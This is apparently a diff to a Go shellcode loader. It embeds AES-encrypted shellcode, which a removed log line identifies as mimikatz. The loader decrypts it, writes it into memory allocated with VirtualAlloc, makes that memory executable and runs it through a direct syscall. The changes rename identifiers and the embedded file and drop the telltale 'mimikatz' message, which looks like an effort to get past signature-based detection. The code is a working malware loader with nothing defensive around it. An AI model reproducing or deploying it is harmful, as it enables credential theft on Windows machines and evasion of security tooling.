@@ -13,7 +13,7 @@ import (
 )
 
 var (
-	//go:embed "encrypted_shellcode"
+	//go:embed "encrypted_sc"
 	encryptedShellcode []byte
 
 	//go:embed "key"
@@ -41,20 +41,19 @@ func decryptAES(data []byte, key []byte) ([]byte, error) {
 
 // Credits to Joff Thyer for Direct Syscall Strategy: https://www.youtube.com/watch?v=gH9qyHVc9-M
 func main() {
-	fmt.Println("Decrypting mimikatz shellcode...")
-	shellcode, err := decryptAES(encryptedShellcode, key)
+	sc, err := decryptAES(encryptedShellcode, key)
 	checkErr(err)
 	// syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
 	kernel32 := windows.NewLazyDLL("kernel32.dll")
 	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
-	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)),
+	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	checkErr(err)
-	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
 
 	var oldProtect uint32
-	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
 	checkErr(err)
 
 	syscall.SyscallN(addr, 0, 0, 0, 0)
